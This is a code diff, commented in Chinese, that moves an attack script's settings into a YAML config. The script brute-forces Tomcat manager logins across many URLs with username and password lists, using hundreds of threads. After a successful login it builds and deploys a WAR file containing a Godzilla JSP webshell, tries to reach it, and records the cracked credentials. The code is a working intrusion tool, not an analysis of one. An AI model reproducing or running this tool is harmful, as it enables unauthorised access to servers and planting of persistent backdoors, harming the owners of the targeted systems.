@@ -1,9 +1,9 @@
+import yaml
 import logging
 import requests
 from requests.auth import HTTPBasicAuth
 from colorama import Fore, Style
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
 import os
 import time
 import re
@@ -13,11 +13,16 @@ import random
 import string
 
 # 忽略HTTPS请求中的不安全请求警告
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+requests.packages.urllib3.disable_warnings()
 
 # 配置日志格式，输出INFO级别及以上的日志消息
 logging.basicConfig(level=logging.INFO, format='%(message)s')
 logger = logging.getLogger()
+
+# 加载配置文件
+def load_config(config_file):
+    with open(config_file, 'r', encoding='utf-8') as file:
+        return yaml.safe_load(file)
 
 # 通用文件读取函数：用于加载用户名、密码或URL列表文件
 def load_file(file_path):
@@ -36,11 +41,12 @@ def generate_random_string(length=6):
     return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
 
 # 生成 WAR 文件，其中包含 Godzilla Webshell
-def generate_war():
+def generate_war(config):
+    shell_file_path = config['files']['shell_file']  # 从 config 中读取 shell 文件路径
+
     random_string = generate_random_string()
     war_file_name = f"{random_string}.war"
     shell_file_name = f"{generate_random_string()}.jsp"
-    shell_file_path = 'shell.jsp'
 
     if not os.path.isfile(shell_file_path):
         logger.error(f"文件 {shell_file_path} 不存在")
@@ -86,7 +92,7 @@ def get_jsessionid_and_csrf_nonce(url, username, password):
         return None, None, None
 
 # 部署 Godzilla Webshell 并尝试访问上传的 Webshell
-def deploy_godzilla_war(url, username, password, war_file_path, random_string, shell_file_name, output_file, max_retries=3):
+def deploy_godzilla_war(url, username, password, war_file_path, random_string, shell_file_name, output_file, max_retries, retry_delay):
     url = clean_url(url)  # 清理 URL，确保格式正确
     jsessionid, csrf_nonce, file_field_name = get_jsessionid_and_csrf_nonce(url, username, password)
 
@@ -122,7 +128,7 @@ def deploy_godzilla_war(url, username, password, war_file_path, random_string, s
         attempt += 1
         if attempt < max_retries:
             logger.info(f"{Fore.CYAN}[!] 重试上传 ({attempt}/{max_retries})...{Style.RESET_ALL}")
-            time.sleep(2)   # 重试前等待2秒
+            time.sleep(retry_delay)   # 重试前等待设定时间
 
     # 上传成功或失败后，删除 WAR 文件
     if os.path.isfile(war_file_path):
@@ -133,7 +139,7 @@ def deploy_godzilla_war(url, username, password, war_file_path, random_string, s
             logger.error(f"[-] 删除 WAR 文件失败: {str(e)}")
 
 # 弱口令检测函数
-def check_weak_password(url, usernames, passwords, output_file, max_retries=3):
+def check_weak_password(url, usernames, passwords, output_file, max_retries, retry_delay, config):
     attempt = 0
     while attempt < max_retries:
         try:
@@ -147,10 +153,13 @@ def check_weak_password(url, usernames, passwords, output_file, max_retries=3):
                             f.write(success_entry + "\n")
 
                         # 登录成功后生成WAR文件
-                        war_file_name, random_string, shell_file_name = generate_war()
+                        war_file_name, random_string, shell_file_name = generate_war(config)
                         if war_file_name:
                             # 部署 Godzilla WAR 包并尝试获取 shell
-                            deploy_godzilla_war(url, username, password, war_file_name, random_string, shell_file_name,output_file)
+                            deploy_godzilla_war(url, username, password, war_file_name, random_string, shell_file_name,
+                                                output_file,
+                                                config['retry']['deploy_godzilla_war']['max_retries'],
+                                                config['retry']['deploy_godzilla_war']['retry_delay'])
                         return (url, username, password)
                     else:
                         logger.info(
@@ -159,7 +168,7 @@ def check_weak_password(url, usernames, passwords, output_file, max_retries=3):
         except requests.exceptions.RequestException as e:
             logger.warning(
                 f"{Fore.YELLOW}[!] 网站访问失败 {url} 尝试重新访问 {attempt + 1}/{max_retries}{Style.RESET_ALL}")
-            time.sleep(2)   # 重试前等待2秒
+            time.sleep(retry_delay)   # 重试前等待
             attempt += 1
     if attempt == max_retries:
         logger.error(f"{Fore.CYAN}[-] 最大重试次数已达，无法访问 {url}，将该 URL 从检测列表中移除 {Style.RESET_ALL}")
@@ -167,49 +176,31 @@ def check_weak_password(url, usernames, passwords, output_file, max_retries=3):
 
     return url, None, None
 
-# 动态调整线程池大小，确保资源使用合理
-def adjust_thread_pool_size(usernames, passwords, max_workers_limit, min_workers):
-    combination_count = len(usernames) * len(passwords)
+# 主函数
+def main():
+    config = load_config("config.yaml")
 
-    # 每200个组合使用一个线程，最大不超过max_workers_limit
-    workers = min(max(min_workers, combination_count // 200), max_workers_limit)
+    urls = load_file(config['files']['url_file'])
+    usernames = load_file(config['files']['user_file'])
+    passwords = load_file(config['files']['passwd_file'])
+    output_file = config['files']['output_file']
 
+    # 根据用户名和密码组合总数调整线程池大小
+    combination_count = len(urls) * len(usernames) * len(passwords)
+    max_workers_limit = config['thread_pool']['max_workers_limit']
+    min_workers = config['thread_pool']['min_workers']
+
+    workers = min(max(min_workers, combination_count), max_workers_limit)
     logger.info(f"根据用户名和密码组合总数 {combination_count} 调整线程池大小为 {workers}")
-    return workers
 
-# 多线程处理多个URL的弱口令检测
-def check_urls_in_threads(urls, usernames, passwords, output_file, max_workers_limit, min_workers):
-    max_workers = adjust_thread_pool_size(usernames, passwords, max_workers_limit, min_workers)
+    with ThreadPoolExecutor(max_workers=workers) as executor:
+        futures = [executor.submit(check_weak_password, url, usernames, passwords, output_file,
+                                   config['retry']['check_weak_password']['max_retries'],
+                                   config['retry']['check_weak_password']['retry_delay'],
+                                   config) for url in urls]
 
-    def process_url(url):
-        check_weak_password(url, usernames, passwords, output_file)
-
-    with ThreadPoolExecutor(max_workers=max_workers) as executor:
-        futures = {executor.submit(process_url, url): url for url in urls}
         for future in as_completed(futures):
-            url = futures[future]
-            try:
-                future.result()
-            except Exception as exc:
-                logger.error(f"{url} 生成异常: {exc}")
+            future.result()
 
 if __name__ == "__main__":
-    user_file = 'user.txt'
-    passwd_file = 'passwd.txt'
-    url_file = 'urls.txt'
-    output_file = 'success.txt'
-
-    # 加载用户名、密码和URL列表
-    usernames = load_file(user_file)
-    passwords = load_file(passwd_file)
-    urls = load_file(url_file)
-
-    if not usernames or not passwords or not urls:
-        logger.error("用户名、密码或URL列表为空，请检查文件")
-    else:
-        # 用户可以在这里调整线程池的最大和最小值
-        max_workers_limit = 500  # 用户定义的最大线程数
-        min_workers = 100  # 用户定义的最小线程数
-
-        # 多线程检测URL的弱口令
-        check_urls_in_threads(urls, usernames, passwords, output_file, max_workers_limit, min_workers)
+    main()
